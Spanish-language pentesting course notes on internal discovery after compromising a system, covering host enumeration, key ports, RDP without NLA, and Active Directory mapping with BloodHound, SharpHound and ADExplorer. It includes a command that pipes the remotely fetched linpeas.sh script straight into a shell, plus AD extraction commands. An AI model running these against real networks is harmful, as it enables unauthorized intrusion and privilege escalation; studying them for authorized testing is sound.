# 4. Descubrimiento interno
## D1n0 - Alejandro Maman INSO3A U-TAD - 2025/2026

### Introducción
Una vez comprometido un sistema, preguntarse:
- ¿En qué red se encuentra?
- ¿Con qué usuario? ¿Es necesario elevar privilegios?
- ¿Se tiene nombre o IP interno, o hay que hacer escaneos?

### Análisis del equipo comprometido
- Verificación del usuario y privilegios
- Configuración de red y conexiones establecidas
- Visibilidad con Internet
- Identificación de sistemas internos (sin interacción)
- Usuarios locales y de dominio
- Comandos ejecutados recientemente
- Software instalado (posibles privesc)
- Claves en recursos internos
- Recursos compartidos montados

Scripts de enumeración automática:
```bash
# Windows
# WinEnum: https://raw.githubusercontent.com/neox41/WinEnum/master/WinEnum.bat

# Linux
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Análisis de la red interna
- Pruebas de visibilidad sobre activos conocidos
- Escaneos de rangos colindantes
- Puertos clave:
  - **445** → info y vulnerabilidades SMB
  - **3389** → enumeración RDP
  - **8080** → JBoss/Tomcat o proxy
  - **88 y 389** → Kerberos y LDAP (DCs)

Nomenclatura habitual:
- `SRVMAD001` → Servidor interno
- `SRVDC01` → Controlador de dominio
- `SRVNAS01` → Servidor de almacenamiento

### Puerto 3389 (RDP) sin NLA
```
Crear .rdp con mstsc
Añadir: enablecredsspsupport:i:0
Conectar con el archivo .rdp
```
Permite obtener usuarios conectados y dominio interno.

### Análisis del Directorio Activo — BloodHound
BloodHound analiza el AD e indica rutas para comprometer activos (basado en malos privilegios).
Componentes:
- **SharpHound** (ingestor): extrae datos del AD
- **BloodHound** (UI): análisis visual
- **Neo4j**: base de datos

```bash
# Instalación en Linux
sudo apt-get install bloodhound
sudo neo4j start
# Conectar con neo4j/neo4j en http://localhost:7474 y cambiar clave
```

```cmd
# Extracción con SharpHound (Windows)
sharphound.exe -d <dominio> -c <metodo> --outputdirectory <ruta>
```

Alternativa: volcar AD con **Adexplorer** y parsear con **ADExplorerSnapshot**:
```bash
python3 ADExplorerSnapshot.py <dump AD>.dat
```

---
